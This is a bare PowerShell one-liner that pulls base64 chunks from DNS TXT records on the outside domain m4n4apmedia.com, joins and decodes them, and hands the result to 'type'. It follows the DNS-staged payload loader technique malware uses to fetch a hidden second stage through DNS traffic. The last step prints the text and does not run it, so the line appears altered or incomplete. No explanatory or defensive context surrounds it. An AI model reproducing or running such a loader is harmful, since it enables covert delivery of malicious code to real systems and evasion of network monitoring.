$b64=""; (1..3) | ForEach-Object { $b64+=(nslookup -q=txt "$_.m4n4apmedia.com")[-1] }; type([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
